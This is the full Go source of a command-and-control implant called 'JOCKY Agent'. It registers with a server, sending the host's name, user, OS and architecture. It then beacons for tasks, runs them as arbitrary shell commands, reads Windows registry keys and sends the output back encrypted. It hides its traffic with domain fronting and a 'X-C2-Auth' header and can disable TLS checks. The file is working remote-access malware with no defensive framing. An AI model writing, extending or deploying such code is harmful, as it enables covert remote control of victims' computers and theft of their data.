package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows/registry"
)

const (
	AgentVersion        = "1.0.0"
	ConfigBootstrapURL  = "http://localhost:5000/api/v1/config/bootstrap"
	DefaultHeartbeatInt = 30 * time.Second
	MaxRetries          = 5
	InitialBackoff      = 1 * time.Second
	MaxBackoff          = 5 * time.Minute
	HTTPTimeout         = 15 * time.Second
	LogBufferSize       = 100
	StateDir            = ".jocky"
)

var (
	// Agent identity (generated at bootstrap)
	AgentID     string
	AgentSecret string
	BootstrapID string

	// Runtime config
	Config *AgentConfig

	// Logging
	logMutex sync.Mutex
	logQueue []LogEntry

	// State management
	stateMutex sync.RWMutex
	lastSeenID string
)

type AgentConfig struct {
	ListenerURL  string        `json:"listener_url"`
	FrontDomain  string        `json:"front_domain"`
	C2Auth       string        `json:"c2_auth"`
	HeartbeatInt time.Duration `json:"heartbeat_interval"`
	TLSVerify    bool          `json:"tls_verify"`
	LogLevel     string        `json:"log_level"`
	Timeout      time.Duration `json:"timeout"`
}

type LogEntry struct {
	Timestamp time.Time `json:"timestamp"`
	Level     string    `json:"level"`
	Message   string    `json:"message"`
}

type BootstrapRequest struct {
	BootstrapID string `json:"bootstrap_id"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	Version     string `json:"version"`
}

// CryptoSecureRandom generates cryptographically secure random bytes
func CryptoSecureRandom(n int) (string, error) {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

type RegisterRequest struct {
	AgentID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

type HeartbeatRequest struct {
	AgentID string `json:"agent_id"`
}

type DeploymentResponse struct {
	Deployment *struct {
		DeployID   string `json:"deploy_id"`
		ScriptID   string `json:"script_id"`
		Code       string `json:"code"`
		HashBefore string `json:"hash_before"`
	} `json:"deployment"`
}

type BootstrapResponse struct {
	AgentID     string      `json:"agent_id"`
	AgentSecret string      `json:"agent_secret"`
	Config      AgentConfig `json:"config"`
	Valid       bool        `json:"valid"`
}

// ============================================================
// MAIN ENTRY POINT
// ============================================================

func main() {
	// Initialize logging directory
	if err := ensureStateDir(); err != nil {
		log.Fatalf("[FATAL] Failed to create state directory: %v", err)
	}

	log.Printf("[*] JOCKY Agent %s starting (version %s)", AgentID, AgentVersion)

	// Generate bootstrap ID from environment or create new
	if BootstrapID == "" {
		id, err := CryptoSecureRandom(16)
		if err != nil {
			log.Fatalf("[FATAL] Failed to generate bootstrap ID: %v", err)
		}
		BootstrapID = id
	}

	// Bootstrap configuration from server
	if err := bootstrapConfig(); err != nil {
		log.Fatalf("[FATAL] Bootstrap failed after retries: %v", err)
	}

	log.Printf("[+] Agent registered: %s", AgentID)
	log.Printf("[+] Beaconing to: %s", Config.ListenerURL)

	// Start async log flush goroutine
	go flushLogsAsync()

	// Main heartbeat loop
	heartbeatTicker := time.NewTicker(Config.HeartbeatInt)
	defer heartbeatTicker.Stop()

	for {
		select {
		case <-heartbeatTicker.C:
			if err := performHeartbeatCycle(); err != nil {
				logRemote("error", fmt.Sprintf("Heartbeat cycle failed: %v", err))
			}
		}
	}
}

// ============================================================
// BOOTSTRAP AND CONFIGURATION MANAGEMENT
// ============================================================

func bootstrapConfig() error {
	if err := loadLocalState(); err != nil {
		logRemote("debug", fmt.Sprintf("No local state found: %v", err))
	}

	// If we have config, use it
	if Config != nil {
		return nil
	}

	hostname, _ := os.Hostname()
	username := getUsername()
	osStr := runtime.GOOS
	arch := runtime.GOARCH

	req := BootstrapRequest{
		BootstrapID: BootstrapID,
		Hostname:    hostname,
		Username:    username,
		OS:          osStr,
		Arch:        arch,
		Version:     AgentVersion,
	}

	body, _ := json.Marshal(req)

	// Retry logic with exponential backoff
	for attempt := 0; attempt < MaxRetries; attempt++ {
		client := &http.Client{
			Timeout:   HTTPTimeout,
			Transport: makeTransport(),
		}

		httpReq, err := http.NewRequest("POST", ConfigBootstrapURL, bytes.NewReader(body))
		if err != nil {
			backoff := calculateBackoff(attempt)
			time.Sleep(backoff)
			continue
		}

		httpReq.Header.Set("Content-Type", "application/json")
		httpReq.Header.Set("User-Agent", fmt.Sprintf("JOCKY-Agent/%s", AgentVersion))

		resp, err := client.Do(httpReq)
		if err != nil {
			backoff := calculateBackoff(attempt)
			logRemote("warn", fmt.Sprintf("Bootstrap attempt %d failed: %v, retrying in %v", attempt+1, err, backoff))
			time.Sleep(backoff)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
			backoff := calculateBackoff(attempt)
			logRemote("warn", fmt.Sprintf("Bootstrap returned %d, attempt %d/%d", resp.StatusCode, attempt+1, MaxRetries))
			time.Sleep(backoff)
			continue
		}

		var bootstrapResp BootstrapResponse
		if err := json.NewDecoder(resp.Body).Decode(&bootstrapResp); err != nil {
			backoff := calculateBackoff(attempt)
			logRemote("warn", fmt.Sprintf("Bootstrap decode failed: %v", err))
			time.Sleep(backoff)
			continue
		}

		if !bootstrapResp.Valid || bootstrapResp.AgentSecret == "" {
			return fmt.Errorf("bootstrap response invalid or missing secret")
		}

		// Store bootstrap data
		AgentID = bootstrapResp.AgentID
		AgentSecret = bootstrapResp.AgentSecret
		Config = &bootstrapResp.Config

		// Validate config
		if Config.ListenerURL == "" || Config.FrontDomain == "" {
			return fmt.Errorf("bootstrap config missing required fields")
		}

		// Set defaults
		if Config.HeartbeatInt == 0 {
			Config.HeartbeatInt = DefaultHeartbeatInt
		}
		if Config.Timeout == 0 {
			Config.Timeout = HTTPTimeout
		}

		// Save state locally
		if err := saveLocalState(); err != nil {
			logRemote("warn", fmt.Sprintf("Failed to save local state: %v", err))
		}

		logRemote("info", fmt.Sprintf("Bootstrap successful, agent %s configured", AgentID))
		return nil
	}

	return fmt.Errorf("bootstrap failed after %d retries", MaxRetries)
}

func performHeartbeatCycle() error {
	task, scriptID, err := sendHeartbeat()
	if err != nil {
		return fmt.Errorf("heartbeat failed: %w", err)
	}

	if task == "" {
		return nil // No task available
	}

	logRemote("info", fmt.Sprintf("Received task, script_id: %s", scriptID))

	result := executeJOCKY(task)
	if result == "" {
		logRemote("warn", "Task execution returned empty result")
		return nil
	}

	if scriptID != "" {
		if err := sendResultWithRetry(AgentID, scriptID, result); err != nil {
			logRemote("error", fmt.Sprintf("Failed to send result: %v", err))
			return err
		}
		logRemote("info", fmt.Sprintf("Result submitted for script %s", scriptID))
	}

	return nil
}

func getUsername() string {
	if runtime.GOOS == "windows" {
		return os.Getenv("USERNAME")
	}
	return os.Getenv("USER")
}

func ensureStateDir() error {
	path := filepath.Join(os.TempDir(), StateDir)
	return os.MkdirAll(path, 0700)
}

func getStatePath(filename string) string {
	return filepath.Join(os.TempDir(), StateDir, filename)
}

func saveLocalState() error {
	stateMutex.Lock()
	defer stateMutex.Unlock()

	data := map[string]interface{}{
		"agent_id":     AgentID,
		"agent_secret": AgentSecret,
		"config":       Config,
		"last_updated": time.Now().Unix(),
	}

	body, _ := json.Marshal(data)
	return os.WriteFile(getStatePath("agent.state"), body, 0600)
}

func loadLocalState() error {
	stateMutex.Lock()
	defer stateMutex.Unlock()

	body, err := os.ReadFile(getStatePath("agent.state"))
	if err != nil {
		return err
	}

	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return err
	}

	// Restore values
	if id, ok := data["agent_id"].(string); ok {
		AgentID = id
	}
	if secret, ok := data["agent_secret"].(string); ok {
		AgentSecret = secret
	}
	if configData, ok := data["config"].(map[string]interface{}); ok {
		configJSON, _ := json.Marshal(configData)
		Config = &AgentConfig{}
		json.Unmarshal(configJSON, Config)
	}

	return nil
}

// ============================================================
// RETRY AND BACKOFF LOGIC
// ============================================================

func calculateBackoff(attempt int) time.Duration {
	// Exponential backoff with jitter: base * 2^attempt + random(0, base * 2^attempt)
	exponent := math.Min(float64(attempt), 10) // Cap to prevent overflow
	base := float64(InitialBackoff.Milliseconds())
	delay := base * math.Pow(2, exponent)

	// Add jitter (±25%)
	jitter := delay * 0.25 * (2*randomFloat() - 1)
	totalMS := int64(delay + jitter)

	result := time.Duration(totalMS) * time.Millisecond
	if result > MaxBackoff {
		return MaxBackoff
	}
	if result < InitialBackoff {
		return InitialBackoff
	}
	return result
}

func randomFloat() float64 {
	b := make([]byte, 8)
	rand.Read(b)
	// Simple float generation from random bytes
	return float64(int64(b[0])%256) / 256.0
}

// ============================================================
// LOGGING
// ============================================================

func logRemote(level, message string) {
	logMutex.Lock()
	defer logMutex.Unlock()

	entry := LogEntry{
		Timestamp: time.Now(),
		Level:     level,
		Message:   message,
	}

	// Write to local log
	logToFile(entry)

	// Queue for remote submission
	logQueue = append(logQueue, entry)
	if len(logQueue) > LogBufferSize {
		logQueue = logQueue[1:] // Drop oldest
	}
}

func logToFile(entry LogEntry) {
	logPath := getStatePath("agent.log")
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()

	timestamp := entry.Timestamp.Format("2006-01-02 15:04:05")
	msg := fmt.Sprintf("[%s] %s: %s\n", timestamp, entry.Level, entry.Message)
	f.WriteString(msg)
}

func flushLogsAsync() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		logMutex.Lock()
		if len(logQueue) > 0 && Config != nil && AgentSecret != "" {
			entries := logQueue
			logQueue = nil
			logMutex.Unlock()

			flushLogsToServer(entries)
		} else {
			logMutex.Unlock()
		}
	}
}

func flushLogsToServer(entries []LogEntry) {
	// Queue logs for submission to server
	payload := map[string]interface{}{
		"agent_id": AgentID,
		"logs":     entries,
	}

	body, _ := json.Marshal(payload)

	client := &http.Client{
		Timeout:   HTTPTimeout,
		Transport: makeTransport(),
	}

	httpReq, err := http.NewRequest("POST", Config.ListenerURL+"/api/v1/logs/submit", bytes.NewReader(body))
	if err != nil {
		return
	}

	applyAuthHeaders(httpReq)

	resp, err := client.Do(httpReq)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// ============================================================
// JOCKY SCRIPT PARSER AND EXECUTION
// ============================================================

func executeJOCKY(script string) string {
	if script == "" {
		logRemote("warn", "Received empty script")
		return "error: empty script"
	}

	script = strings.TrimSpace(script)
	const maxScriptLen = 1024 * 1024 // 1MB limit
	if len(script) > maxScriptLen {
		logRemote("warn", fmt.Sprintf("Script exceeded size limit: %d bytes", len(script)))
		return "error: script too large"
	}

	// If it's a plain command (no curly braces), run as shell
	if !strings.Contains(script, "agent") && !strings.Contains(script, "{") {
		return runShellCommand(script)
	}

	// Try to extract exec("...") or exec('...')
	if strings.Contains(script, "exec(") {
		cmd := extractQuotedArg(script, "exec(")
		if cmd != "" {
			return runShellCommand(cmd)
		}
	}

	// Try to extract collect_registry("...")
	if strings.Contains(script, "collect_registry(") {
		path := extractQuotedArg(script, "collect_registry(")
		if path != "" {
			path = strings.ReplaceAll(path, "\\\\", "\\")
			return collectRegistry(path)
		}
	}

	// Fallback: try to run the whole script as a command
	return runShellCommand(script)
}

func extractQuotedArg(script, funcName string) string {
	start := strings.Index(script, funcName)
	if start == -1 {
		return ""
	}

	start += len(funcName)
	if start >= len(script) {
		return ""
	}

	if script[start] != '"' && script[start] != '\'' {
		return ""
	}

	quote := script[start]
	end := strings.Index(script[start+1:], string(quote))
	if end == -1 {
		return ""
	}

	return script[start+1 : start+1+end]
}

func runShellCommand(cmdStr string) string {
	// Sanitize input
	cmdStr = strings.TrimSpace(cmdStr)
	if cmdStr == "" {
		return "error: empty command"
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}

	// Set timeout
	done := make(chan error, 1)
	output := make([]byte, 0, 10*1024*1024) // 10MB buffer max

	go func() {
		out, err := cmd.Output()
		output = out
		done <- err
	}()

	select {
	case err := <-done:
		if err != nil {
			logRemote("debug", fmt.Sprintf("Command execution error: %v", err))
			return "error: " + err.Error()
		}
		return string(output)
	case <-time.After(Config.Timeout):
		cmd.Process.Kill()
		logRemote("warn", "Command execution timeout")
		return "error: execution timeout"
	}
}

func collectRegistry(path string) string {
	if runtime.GOOS != "windows" {
		return "error: registry access only supported on Windows"
	}

	parts := strings.SplitN(path, "\\", 2)
	if len(parts) != 2 {
		logRemote("warn", fmt.Sprintf("Invalid registry path: %s", path))
		return "error: invalid registry path format"
	}

	hiveStr, keyPath := parts[0], parts[1]

	var hive registry.Key
	switch strings.ToUpper(hiveStr) {
	case "HKLM":
		hive = registry.LOCAL_MACHINE
	case "HKCU":
		hive = registry.CURRENT_USER
	case "HKCR":
		hive = registry.CLASSES_ROOT
	case "HKU":
		hive = registry.USERS
	case "HKCC":
		hive = registry.CURRENT_CONFIG
	default:
		return "error: unknown hive " + hiveStr
	}

	key, err := registry.OpenKey(hive, keyPath, registry.READ)
	if err != nil {
		logRemote("debug", fmt.Sprintf("Registry open failed: %v", err))
		return "error: " + err.Error()
	}
	defer key.Close()

	valueNames, err := key.ReadValueNames(0)
	if err != nil {
		logRemote("debug", fmt.Sprintf("Registry read failed: %v", err))
		return "error: " + err.Error()
	}

	var result strings.Builder
	for _, name := range valueNames {
		val, _, err := key.GetStringValue(name)
		if err != nil {
			continue
		}
		result.WriteString(fmt.Sprintf("%s: %s\n", name, val))
	}

	if result.Len() == 0 {
		return "No values found"
	}

	return result.String()
}

// ============================================================
// CRYPTOGRAPHY AND SECURE COMMUNICATION
// ============================================================

// deriveAgentKey uses PBKDF2 for proper key derivation
func deriveAgentKey(secret string) ([]byte, error) {
	if secret == "" {
		return nil, fmt.Errorf("empty agent secret")
	}

	// Use a constant salt (can be improved with per-agent salt)
	salt := []byte("jocky-agent-kdf-v1")

	// PBKDF2 with SHA256, 100000 iterations, 32-byte key
	key := pbkdf2.Key([]byte(secret), salt, 100000, 32, sha256.New)
	return key, nil
}

func encryptPayload(plaintext string) (string, error) {
	if AgentSecret == "" {
		return "", fmt.Errorf("agent secret not initialized")
	}

	key, err := deriveAgentKey(AgentSecret)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("cipher creation failed: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("GCM creation failed: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", fmt.Errorf("nonce generation failed: %w", err)
	}

	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decryptPayload(ciphertext string) (string, error) {
	if AgentSecret == "" {
		return "", fmt.Errorf("agent secret not initialized")
	}

	key, err := deriveAgentKey(AgentSecret)
	if err != nil {
		return "", err
	}

	data, err := base64.StdEncoding.DecodeString(ciphertext)
	if err != nil {
		return "", fmt.Errorf("base64 decode failed: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("cipher creation failed: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("GCM creation failed: %w", err)
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return "", fmt.Errorf("ciphertext too short")
	}

	nonce, data := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, data, nil)
	if err != nil {
		return "", fmt.Errorf("decryption failed: %w", err)
	}

	return string(plaintext), nil
}

// ============================================================
// HTTP TRANSPORT AND AUTHENTICATION
// ============================================================

func makeTransport() *http.Transport {
	return &http.Transport{
		TLSClientConfig: &tls.Config{
			ServerName: Config.FrontDomain,
			// InsecureSkipVerify should only be true in non-production environments
			InsecureSkipVerify: !Config.TLSVerify,
		},
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 2,
		IdleConnTimeout:     30 * time.Second,
	}
}

func applyAuthHeaders(req *http.Request) {
	if Config != nil {
		req.Header.Set("X-C2-Auth", Config.C2Auth)
	}
	if AgentSecret != "" {
		req.Header.Set("X-Agent-Secret", AgentSecret)
	}
	if Config != nil {
		req.Header.Set("Host", Config.FrontDomain)
	}
	req.Header.Set("X-Agent-ID", AgentID)
	req.Header.Set("X-Agent-Version", AgentVersion)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", fmt.Sprintf("JOCKY-Agent/%s", AgentVersion))
}

// ============================================================
// HEARTBEAT AND RESULT SUBMISSION
// ============================================================

func sendHeartbeat() (string, string, error) {
	if Config == nil || AgentSecret == "" {
		return "", "", fmt.Errorf("agent not configured")
	}

	reqBody := HeartbeatRequest{AgentID: AgentID}
	body, _ := json.Marshal(reqBody)

	for attempt := 0; attempt < MaxRetries; attempt++ {
		client := &http.Client{
			Timeout:   Config.Timeout,
			Transport: makeTransport(),
		}

		req, err := http.NewRequest("POST", Config.ListenerURL+"/api/v1/agent/heartbeat", bytes.NewReader(body))
		if err != nil {
			backoff := calculateBackoff(attempt)
			time.Sleep(backoff)
			continue
		}

		applyAuthHeaders(req)

		resp, err := client.Do(req)
		if err != nil {
			backoff := calculateBackoff(attempt)
			logRemote("debug", fmt.Sprintf("Heartbeat send failed (attempt %d): %v", attempt+1, err))
			time.Sleep(backoff)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			backoff := calculateBackoff(attempt)
			logRemote("debug", fmt.Sprintf("Heartbeat returned %d, attempt %d/%d", resp.StatusCode, attempt+1, MaxRetries))
			time.Sleep(backoff)
			continue
		}

		var deploymentResp DeploymentResponse
		if err := json.NewDecoder(resp.Body).Decode(&deploymentResp); err != nil {
			logRemote("debug", fmt.Sprintf("Heartbeat decode error: %v", err))
			return "", "", err
		}

		if deploymentResp.Deployment != nil {
			logRemote("debug", fmt.Sprintf("Task received: %s", deploymentResp.Deployment.ScriptID))
			return deploymentResp.Deployment.Code, deploymentResp.Deployment.ScriptID, nil
		}

		return "", "", nil
	}

	return "", "", fmt.Errorf("heartbeat failed after retries")
}

func sendResultWithRetry(agentID, scriptID, result string) error {
	for attempt := 0; attempt < MaxRetries; attempt++ {
		if err := sendResultToDashboard(agentID, scriptID, result); err == nil {
			return nil
		}

		backoff := calculateBackoff(attempt)
		logRemote("debug", fmt.Sprintf("Result send failed (attempt %d), retrying in %v", attempt+1, backoff))
		time.Sleep(backoff)
	}

	return fmt.Errorf("result submission failed after retries")
}

func sendResultToDashboard(agentID, scriptID, result string) error {
	if Config == nil || AgentSecret == "" {
		return fmt.Errorf("agent not configured")
	}

	encrypted, err := encryptPayload(result)
	if err != nil {
		return fmt.Errorf("encryption failed: %w", err)
	}

	payload := map[string]string{
		"agent_id":  agentID,
		"script_id": scriptID,
		"data_enc":  encrypted,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	client := &http.Client{
		Timeout:   Config.Timeout,
		Transport: makeTransport(),
	}

	req, err := http.NewRequest("POST", Config.ListenerURL+"/api/v1/result/submit", bytes.NewReader(body))
	if err != nil {
		return err
	}

	applyAuthHeaders(req)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("result submit failed: status %d", resp.StatusCode)
	}

	return nil
}
